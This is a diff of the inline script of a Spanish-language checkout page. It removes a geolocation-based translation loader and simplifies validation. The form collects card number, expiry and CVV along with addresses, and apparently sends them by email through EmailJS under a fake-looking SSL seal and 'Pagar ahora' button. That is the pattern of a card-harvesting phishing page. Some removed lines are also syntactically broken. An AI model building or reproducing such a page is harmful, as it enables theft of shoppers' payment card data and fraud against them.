@@ -276,128 +276,12 @@ input.error, select.error{border-color: var(--danger);}
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
 <script>
-/* ---------------------------
-   Multilenguaje (country+browser)
-   carga ./lang/es.json o ./lang/en.json
-   --------------------------- */
-async function cargarTraducciones(lang) {
-  try {
-    const res = await fetch(`./lang/${lang}.json`);
-    if (!res.ok) throw new Error('No se pudo cargar JSON');
-    return await res.json();
-  } catch (e) {
-    console.error("Error cargando traducciones:", e);
-    return null;
-  }
-}
-
-async function initIdioma() {
-  let idioma = "en";
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    if (res && res.ok) {
-      const data = await res.json();
-      const country = data.country_code;
-      if (country === "MX") idioma = "es";
-      else if (country === "US") idioma = "en";
-      else idioma = navigator.language && navigator.language.startsWith("es") ? "es" : "en";
-    } else {
-      idioma = navigator.language && navigator.language.startsWith("es") ? "es" : "en";
-    }
-  } catch (err) {
-    idioma = navigator.language && navigator.language.startsWith("es") ? "es" : "en";
-  }
-
-  const t = await cargarTraducciones(idioma);
-  if (!t) return;
-
-  // Guardar traducciones globalmente para reuso (ej. reset de botón)
-  window._translations = t;
-
-  // Textos principales
-  const tituloEl = document.getElementById("titulo");
-  if (tituloEl) tituloEl.innerText = t.titulo;
-  const subEl = document.getElementById("subtitulo");
-  if (subEl) subEl.innerText = t.subtitulo;
-  const payBtn = document.getElementById("payBtn");
-  if (payBtn) payBtn.innerText = t.boton;
-  const errEl = document.getElementById("errorMsg");
-  if (errEl) errEl.innerText = t.error;
-  const sslEl = document.querySelector(".ssl-seal");
-  if (sslEl) sslEl.innerHTML = `🔒 ${t.ssl}`;
-
-  // Secciones
-  const sections = document.querySelectorAll(".section-title");
-  if (sections.length >= 3) {
-    sections[0].innerHTML = `<span class="badge">1</span> ${t.secciones.envio}`;
-    sections[1].innerHTML = `<span class="badge">2</span> ${t.secciones.facturacion}`;
-    sections[2].innerHTML = `<span class="badge">3</span> ${t.secciones.pago}`;
-  }
-
-  // Labels por 'for'
-  const labelMap = {
-    shipName: t.envio.nombre,
-    shipEmail: t.envio.email,
-    shipPhone: t.envio.telefono,
-    shipPostal: t.envio.postal,
-    shipCity: t.envio.ciudad,
-    shipCountry: t.envio.pais,
-    shipState: t.envio.estado,
-    shipAddress: t.envio.direccion,
-    billName: t.facturacion.nombre,
-    billRFC: t.facturacion.rfc,
-    billCountry: t.facturacion.pais,
-    billState: t.facturacion.estado,
-    billAddress: t.facturacion.direccion,
-    cardName: t.pago.nombre,
-    cardNumber: t.pago.numero,
-    cardExp: t.pago.vencimiento,
-    cardCvv: t.pago.cvv,
-    cardType: t.pago.tipo,
-    meses: t.pago.meses
-  };
-
-  Object.entries(labelMap).forEach(([forId, text]) => {
-    const lbl = document.querySelector(`label[for='${forId}']`);
-    if (lbl) lbl.innerText = text;
-  });
-
-  // Checkbox sameAsShipping (reemplaza el texto manteniendo el checkbox)
-  const sameCheckboxParent = document.querySelector("#sameAsShipping")?.parentNode;
-  if (sameCheckboxParent) {
-    sameCheckboxParent.innerHTML = `<input type="checkbox" id="sameAsShipping" checked> ${t.facturacion.mismos_datos}`;
-  }
-
-  // Opciones de selects (cardType & meses)
-  const cardType = document.getElementById("cardType");
-  if (cardType) {
-    if (cardType.options.length >= 3) {
-      cardType.options[0].text = t.pago.opciones.selecciona;
-      cardType.options[1].text = t.pago.opciones.debito;
-      cardType.options[2].text = t.pago.opciones.credito;
-    }
-  }
-  const mesesSelect = document.getElementById("meses");
-  if (mesesSelect && mesesSelect.options.length >= 4) {
-    mesesSelect.options[0].text = t.pago.opciones_msi.selecciona;
-    mesesSelect.options[1].text = t.pago.opciones_msi.tres;
-    mesesSelect.options[2].text = t.pago.opciones_msi.seis;
-    mesesSelect.options[3].text = t.pago.opciones_msi.nueve;
-  }
-}
-
-/* ---------------------------
-   Resto del script ORIGINAL (validaciones, EmailJS, envío)
-   --------------------------- */
-document.addEventListener("DOMContentLoaded", async () => {
-  // Primero carga traducciones (intenta); si falla, sigue con el resto.
-  await initIdioma();
-
+document.addEventListener("DOMContentLoaded", () => {
   const form = document.getElementById("checkoutForm");
   const btn = document.getElementById("payBtn");
   const spinner = document.getElementById("spinner");
   const errorMsg = document.getElementById("errorMsg");
-  let sameAsShipping = document.getElementById("sameAsShipping"); // se reasignará si initIdioma lo recreó
+  const sameAsShipping = document.getElementById("sameAsShipping");
   const billingSection = document.getElementById("billingSection");
   const cardExp = document.getElementById("cardExp");
   const cardType = document.getElementById("cardType");
@@ -408,9 +292,6 @@ document.addEventListener("DOMContentLoaded", async () => {
   const shipState = document.getElementById("shipState");
   const billCountry = document.getElementById("billCountry");
   const billState = document.getElementById("billState");
-
-  // Si initIdioma reemplazó el checkbox, volverlo a obtener
-  sameAsShipping = document.getElementById("sameAsShipping");
 
   const states = {
     MX: ["Aguascalientes","Baja California","Baja California Sur","Campeche","Chiapas","Chihuahua","Ciudad de México","Coahuila","Colima","Durango","Estado de México","Guanajuato","Guerrero","Hidalgo","Jalisco","Michoacán","Morelos","Nayarit","Nuevo León","Oaxaca","Puebla","Querétaro","Quintana Roo","San Luis Potosí","Sinaloa","Sonora","Tabasco","Tamaulipas","Tlaxcala","Veracruz","Yucatán","Zacatecas"],
@@ -428,41 +309,34 @@ document.addEventListener("DOMContentLoaded", async () => {
     });
   }
 
-  // Inicializar selects de estado (si existen)
-  if (shipCountry && shipState) populateStates(shipCountry, shipState);
-  if (billCountry && billState) populateStates(billCountry, billState);
+  populateStates(shipCountry, shipState);
+  populateStates(billCountry, billState);
 
-  if (shipCountry) shipCountry.addEventListener("change", () => populateStates(shipCountry, shipState));
-  if (billCountry) billCountry.addEventListener("change", () => populateStates(billCountry, billState));
+  shipCountry.addEventListener("change", () => populateStates(shipCountry, shipState));
+  billCountry.addEventListener("change", () => populateStates(billCountry, billState));
 
-  if (sameAsShipping) {
-    sameAsShipping.addEventListener("change", () => {
-      billingSection.style.display = sameAsShipping.checked ? "none" : "block";
-    });
-  }
+  sameAsShipping.addEventListener("change", () => {
+    billingSection.style.display = sameAsShipping.checked ? "none" : "block";
+  });
 
-  if (cardExp) {
-    cardExp.addEventListener("input", () => {
-      let value = cardExp.value.replace(/[^0-9]/g, "");
-      if (value.length >= 3) {
-        value = value.substring(0, 2) + "/" + value.substring(2, 4);
-      }
-      cardExp.value = value;
-    });
-  }
+  cardExp.addEventListener("input", () => {
+    let value = cardExp.value.replace(/[^0-9]/g, "");
+    if (value.length >= 3) {
+      value = value.substring(0, 2) + "/" + value.substring(2, 4);
+    }
+    cardExp.value = value;
+  });
 
-  if (cardType) {
-    cardType.addEventListener("change", () => {
-      if (cardType.value === "credito") {
-        mesesContainer.style.display = "block";
-        meses.setAttribute("required", "required");
-      } else {
-        mesesContainer.style.display = "none";
-        meses.removeAttribute("required");
-        meses.value = "";
-      }
-    });
-  }
+  cardType.addEventListener("change", () => {
+    if (cardType.value === "credito") {
+      mesesContainer.style.display = "block";
+      meses.setAttribute("required", "required");
+    } else {
+      mesesContainer.style.display = "none";
+      meses.removeAttribute("required");
+      meses.value = "";
+    }
+  });
 
   function validLuhn(number) {
     const arr = (number + '').replace(/\D/g,'').split('').reverse().map(x=>+x);
@@ -500,22 +374,14 @@ document.addEventListener("DOMContentLoaded", async () => {
     return valid;
   }
 
-  // Inicializar EmailJS (mantengo tu public key)
   emailjs.init("T72Wf1jx7lTBM9Md-");
 
-  // Validaciones al perder el foco
-  form.querySelectorAll("input,select").forEach(el => {
-    el.addEventListener("blur", () => validateField(el));
-  });
-
-  // Submit (solo uno)
-  form.addEventListener("submit", (e) => {
+  form.addEventListener("submit", e => {
     e.preventDefault();
-    errorMsg.style.display = "none";
+    const fields = Array.from(document.querySelectorAll("input, select"));
     let valid = true;
-    const fields = Array.from(form.querySelectorAll("input,select"));
     fields.forEach(f => {
-      if (f.closest("#billingSection") && sameAsShipping && sameAsShipping.checked) return;
+      if (f.closest("#billingSection") && sameAsShipping.checked) return;
       if (!validateField(f)) valid = false;
     });
     if (!valid) return;
@@ -529,31 +395,16 @@ document.addEventListener("DOMContentLoaded", async () => {
       .then(() => {
         spinner.style.display = "none";
         btn.disabled = false;
-        btn.textContent = (window._translations && window._translations.boton) ? window._translations.boton : "Pagar ahora";
-        // Mostrar mensaje de éxito (uso alert para mantener simple)
-        alert((window._translations && window._translations.success_message) ? window._translations.success_message :
-        form.reset();
-        // reenfocar estados en selects
-        if (shipCountry && shipState) populateStates(shipCountry, shipState);
-        if (billCountry && billState) populateStates(billCountry, billState);
+        btn.textContent = "Pagar ahora";
+        errorMsg.style.display = "block"; // aquí podrías poner mensaje de éxito
       })
       .catch(() => {
         spinner.style.display = "none";
         btn.disabled = false;
-        btn.textContent = (window._translations && window._translations.boton) ? window._translations.boton : "Pagar ahora";
-        const t = window._translations;
-        errorMsg.textContent = (t && t.error) ? t.error :
+        btn.textContent = "Pagar ahora";
         errorMsg.style.display = "block";
       });
   });
-
-  // (Opcional) rehacer sameAsShipping variable if the checkbox was re-rendered by language init
-  sameAsShipping = document.getElementById("sameAsShipping");
-  if (sameAsShipping) {
-    sameAsShipping.addEventListener("change", () => {
-      billingSection.style.display = sameAsShipping.checked ? "none" : "block";
-    });
-  }
 });
 </script>
 </body>
